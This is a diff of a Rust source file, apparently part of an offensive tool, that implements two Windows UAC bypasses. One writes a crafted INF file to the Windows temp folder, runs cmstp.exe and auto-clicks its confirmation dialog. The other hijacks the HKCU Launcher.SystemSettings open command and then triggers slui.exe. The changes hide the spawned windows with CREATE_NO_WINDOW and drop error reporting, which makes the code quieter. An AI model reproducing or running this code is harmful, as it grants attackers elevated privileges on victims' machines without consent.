@@ -1,8 +1,6 @@
-#![windows_subsystem = "windows"]
 #[cfg(target_os = "windows")]
 mod fsr;
-use is_elevated::*;
-use std::env::args;
+
 use std::ffi::CString;
 use std::fs::File;
 use std::io::Write;
@@ -10,27 +8,33 @@ use std::process::{Command, Stdio};
 use std::ptr::null_mut;
 use std::thread;
 use std::time::Duration;
+
 use winapi::um::winuser::{
     FindWindowA, FindWindowExA, SendMessageA, SetForegroundWindow, ShowWindow, BM_CLICK,
     SW_SHOWNORMAL,
 };
 use winapi::um::winuser::{SendInput, INPUT, INPUT_KEYBOARD, KEYBDINPUT, VK_RETURN};
+
+#[cfg(target_os = "windows")]
+use std::os::windows::process::CommandExt;
+
 #[cfg(target_os = "windows")]
 use winreg::enums::*;
 #[cfg(target_os = "windows")]
 use winreg::RegKey;
 
+#[cfg(target_os = "windows")]
+const CREATE_NO_WINDOW: u32 = 0x08000000;
+
+
 /// Create/modify a registry value under HKCU
 #[cfg(target_os = "windows")]
 pub fn set_hkcu_value(
     path: &str,
-    name: Option<&str>,        // None => (Default)
-    value: Option<&str>,       // None => no data
+    name: Option<&str>,
+    value: Option<&str>,
     create: bool,
 ) -> std::io::Result<()> {
-    use winreg::enums::*;
-    use winreg::RegKey;
-
     let hkcu = RegKey::predef(HKEY_CURRENT_USER);
 
     let key = if create {
@@ -40,21 +44,15 @@ pub fn set_hkcu_value(
     };
 
     match (name, value) {
-        // named value with data
         (Some(n), Some(v)) => key.set_value(n, &v)?,
-
-        // default value with data
         (None, Some(v)) => key.set_value("", &v)?,
-
-        // named value with NO data
-        (Some(n), None) => key.set_value(n, &"")?, // see note below
-
-        // default value with NO data
+        (Some(n), None) => key.set_value(n, &"")?,
         (None, None) => key.set_value("", &"")?,
     }
 
     Ok(())
 }
+
 static INF_TEMPLATE: &str = r#"[version]
 Signature=$chicago$
 AdvancedINF=2.5
@@ -77,65 +75,76 @@ taskkill /IM cmstp.exe /F
 ServiceName="CorpVPN"
 ShortSvcName="CorpVPN"
 "#;
+
+/// Launch a program with WOW64 FS redirection disabled
 #[cfg(target_os = "windows")]
 pub fn launch_with_fsr_disabled(program: &str) -> std::io::Result<()> {
-
-    // Guard disables FSR on creation and restores it on drop.
     let _guard = fsr::DisableFsRedirection::new();
 
     Command::new(program)
+        .creation_flags(CREATE_NO_WINDOW)
         .stdout(Stdio::null())
         .stderr(Stdio::null())
         .spawn()?;
 
-    // `_guard` goes out of scope here → redirection is restored automatically.
     Ok(())
 }
 
+/// Generate INF file
 pub fn generate_inf_file(command: &str) -> String {
-    let temp_dir = "C:\\windows\\temp";
-    let random_file_name = format!("{}\\{}.inf", temp_dir, uuid::Uuid::new_v4());
-    let inf_data = INF_TEMPLATE.replace("REPLACE_COMMAND_LINE", command);
+    let temp_dir = "C:\\Windows\\Temp";
+    let file = format!("{}\\{}.inf", temp_dir, uuid::Uuid::new_v4());
 
-    let mut file = File::create(&random_file_name).expect("Failed to create INF file");
-    file.write_all(inf_data.as_bytes())
-        .expect("Failed to write INF file");
+    let data = INF_TEMPLATE.replace("REPLACE_COMMAND_LINE", command);
 
-    random_file_name
+    let mut f = File::create(&file).expect("Failed to create INF");
+    f.write_all(data.as_bytes())
+        .expect("Failed to write INF");
+
+    file
 }
 
+/// Execute cmstp silently
 fn execute_cmstp(inf_file: &str) {
-    let binary_path = "C:\\windows\\system32\\cmstp.exe";
+    let binary = "C:\\Windows\\System32\\cmstp.exe";
 
-    if !std::path::Path::new(binary_path).exists() {
-        eprintln!("cmstp.exe binary not found!");
+    if !std::path::Path::new(binary).exists() {
+        eprintln!("cmstp.exe not found");
         return;
     }
 
-    let mut child = Command::new(binary_path)
+    let mut child = Command::new(binary)
         .arg("/au")
         .arg(inf_file)
+        .creation_flags(CREATE_NO_WINDOW)
         .stdout(Stdio::null())
         .stderr(Stdio::null())
         .spawn()
-        .expect("Failed to start cmstp.exe");
+        .expect("Failed to start cmstp");
 
-    let window_titles = ["CorpVPN", "cmstp","Connection Manager Profile Installer","cmstp.exe"];
+    let titles = [
+        "CorpVPN",
+        "cmstp",
+        "Connection Manager Profile Installer",
+        "cmstp.exe",
+    ];
 
-    for title in &window_titles {
-        if interact_with_window(title) {
+    for t in &titles {
+        if interact_with_window(t) {
             break;
         }
     }
-    child.wait().expect("Failed to wait on cmstp.exe");
+
+    let _ = child.wait();
 }
 
-fn interact_with_window(process_name: &str) -> bool {
-    let class_name = CString::new(process_name).unwrap();
+/// Click OK on cmstp window
+fn interact_with_window(name: &str) -> bool {
+    let class = CString::new(name).unwrap();
 
     loop {
         unsafe {
-            let hwnd = FindWindowA(null_mut(), class_name.as_ptr());
+            let hwnd = FindWindowA(null_mut(), class.as_ptr());
             if hwnd.is_null() {
                 continue;
             }
@@ -143,14 +152,14 @@ fn interact_with_window(process_name: &str) -> bool {
             SetForegroundWindow(hwnd);
             ShowWindow(hwnd, SW_SHOWNORMAL);
 
-            let ok_button = FindWindowExA(
+            let ok = FindWindowExA(
                 hwnd,
                 null_mut(),
                 null_mut(),
                 CString::new("OK").unwrap().as_ptr(),
             );
 
-            SendMessageA(ok_button, BM_CLICK, 0, 0);
+            SendMessageA(ok, BM_CLICK, 0, 0);
             simulate_keypress();
 
             return true;
@@ -158,6 +167,7 @@ fn interact_with_window(process_name: &str) -> bool {
     }
 }
 
+/// Press ENTER
 fn simulate_keypress() {
     unsafe {
         let mut input = INPUT {
@@ -177,62 +187,49 @@ fn simulate_keypress() {
     }
 }
 
+/// Delete registry key
 pub fn delete_hkcu_key(path: &str) -> std::io::Result<()> {
     let hkcu = RegKey::predef(HKEY_CURRENT_USER);
-
-    match hkcu.delete_subkey_all(path) {
-        Ok(_) => {
-            println!("Successfully cleaned up");
-            Ok(())
-        }
-        Err(e) => {
-            eprintln!("Failed to delete key: {}", e);
-            Err(e)
-        }
-    }
+    let _ = hkcu.delete_subkey_all(path);
+    Ok(())
 }
 
+/// UAC via slui
 pub fn uac_slui(payload: &String) {
     let path = "Software\\Classes\\Launcher.SystemSettings\\shell\\open\\command";
 
-    // 🔹 best effort cleanup before starting
     let _ = delete_hkcu_key(path);
 
-    // 🔹 create default value
-    if let Err(e) = set_hkcu_value(path, None, Some(payload.as_str()), true) {
-        eprintln!("Failed to set default value: {}", e);
+    if let Err(_) = set_hkcu_value(path, None, Some(payload), true) {
         let _ = delete_hkcu_key(path);
         return;
     }
 
-    // 🔹 create DelegateExecute
-    if let Err(e) = set_hkcu_value(path, Some("DelegateExecute"), None, true) {
-        eprintln!("Failed to set DelegateExecute: {}", e);
+    if let Err(_) = set_hkcu_value(path, Some("DelegateExecute"), None, true) {
         let _ = delete_hkcu_key(path);
         return;
     }
 
-    thread::sleep(Duration::from_secs(5));
-    // 🔹 launch trigger
-    if let Err(e) = launch_with_fsr_disabled("slui.exe")
-    {
-        eprintln!("Failed to launch slui.exe: {}", e);
+    thread::sleep(Duration::from_secs(3));
+
+    if let Err(_) = launch_with_fsr_disabled("slui.exe") {
         let _ = delete_hkcu_key(path);
-        return;
     }
 }
 
+/// Main UAC elevation entry
 pub fn elevate_uac(command: &String) {
-    // 🔹 kill any existing cmstp instances (best effort)
+    // Kill existing cmstp silently
     let _ = Command::new("taskkill")
+        .creation_flags(CREATE_NO_WINDOW)
         .args(&["/IM", "cmstp.exe", "/F"])
         .stdout(Stdio::null())
         .stderr(Stdio::null())
         .spawn();
 
-    // optional: small delay to ensure process is gone
-    std::thread::sleep(std::time::Duration::from_millis(500));
+    // ensure process is gone
+    thread::sleep(Duration::from_secs(2));
 
-    let inf_file = self::generate_inf_file(&command);
-    self::execute_cmstp(&inf_file);
+    let inf = generate_inf_file(command);
+    execute_cmstp(&inf);
 }
